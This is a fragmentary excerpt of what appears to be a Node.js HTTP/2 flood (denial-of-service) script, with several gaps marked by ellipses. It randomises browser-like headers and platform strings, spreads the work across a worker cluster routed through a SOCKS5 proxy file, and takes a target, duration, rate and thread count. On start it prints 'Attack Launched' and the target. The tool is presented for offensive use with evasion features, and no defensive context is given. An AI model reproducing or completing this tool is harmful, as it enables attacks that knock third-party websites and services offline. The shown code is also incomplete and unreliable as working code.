  ...
  Custom: {
    ...
    version: ['Win64; x64', 'Win32; x32']
                        ...
                        if (browserVersion === 120) {
                         ...
                         const accept_header = randomElement(headerBuilder.accept);
                         const encoding_header = randomElement(headerBuilder.acceptEncoding);
                         const lang_header = randomElement(headerBuilder.acceptLang);
...
const secureOptions = 
 ...
 if (process.argv.length < 8){console.log(`Usage: Target Time Rate Thread ProxyFile true/false`); process.exit();}
...
const RESTART_DELAY = 1000;
 ...
 if (cluster.isMaster) {
    ...
    console.log(`Status: ` + `Attack Launched`.green)
    console.log(`Target: ` + process.argv[2].blue)
    console.log(`Time: ` + process.argv[3].blue)
    console.log(`Rate: ` + process.argv[4].blue)
    console.log(`Thread: ` + process.argv[5].blue)
    console.log(`ProxyFile: ` + process.argv[6].blue)
    console.log(`HTTP/2: ` + process.argv[7].blue)
    console.log(`Note: Using Big ProxyFile Socks5`.brightCyan)
    const restartScript = () => {
